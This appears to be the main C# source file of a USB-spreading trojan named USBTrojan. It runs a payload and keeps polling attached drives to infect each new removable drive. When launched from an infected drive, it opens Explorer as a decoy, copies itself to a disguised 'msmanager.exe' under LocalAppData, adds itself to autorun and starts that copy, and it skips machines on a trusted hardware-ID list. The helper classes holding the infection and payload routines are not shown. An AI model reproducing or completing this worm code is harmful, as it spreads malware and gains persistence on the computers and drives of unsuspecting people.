using System;
using System.Threading;
using System.IO;

namespace USBTrojan
{
    class Program
    {
        public static string homeDirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\CommonData";
        
        static void Main(string[] args)
        {
            if (args.Length > 1 && args[0] == "-i")
            {
                USBMode(string.Format("{0}\\{1}",
                    Environment.CurrentDirectory.Split('\\')[0],
                    string.Concat(args).Substring(2)));
            }
            else
            {
                if (Config.HWIDEnabled)
                {
                    Console.WriteLine("Calculating HWID...");
                    Console.WriteLine($"HWID: {HWID.GetHWID()}");
                    if (HWID.CheckHWID())
                    {
                        Console.WriteLine("Trusted HWID, terminating program...");
                        return;
                    }
                }
                Timer timer = new Timer(ResetBlacklist, null, 10000, 10000);
                Console.WriteLine("Executing payload...");
                Tools.RunPayload();
                while (true)
                {
                    BaseMode();
                    Thread.Sleep(500);
                }
            }
        }

        static void ResetBlacklist(object state) {
            Console.WriteLine("Blacklist: clear");
            USB.blacklist.Clear();
        }

        static void BaseMode()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (var drive in drives)
            {
                if (USB.blacklist.Contains(drive.Name))
                {
                    continue;
                }
                Console.WriteLine($"{drive.Name}: supported={USB.IsSupported(drive)}; infected={USB.IsInfected(drive.Name)}");
                if (USB.IsSupported(drive))
                {
                    if (!USB.IsInfected(drive.Name))
                    {
                        Console.WriteLine("new uninfected drive: {0}", drive);
                        if (USB.CreateHomeDirectory(drive.Name) && USB.Infect(drive.Name))
                        {
                            Console.WriteLine("{0} successful infected", drive);
                            USB.blacklist.Add(drive.Name);
                        }
                    }
                    else
                    {
                        USB.blacklist.Add(drive.Name);
                    }
                }
                else
                {
                    USB.blacklist.Add(drive.Name);
                }
            }
        }

        static void USBMode(string path)
        {
            Tools.Start("explorer", "/n, " + path);
            string trojanFile = homeDirectory + "\\msmanager.exe";
            if (!File.Exists(trojanFile))
            {
                try
                {
                    Directory.CreateDirectory(homeDirectory);
                    File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, trojanFile);
                    Tools.AddToAutorun(trojanFile);
                    Tools.Start(trojanFile);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else
            {
                Environment.Exit(0);
            }
        }
    }
}
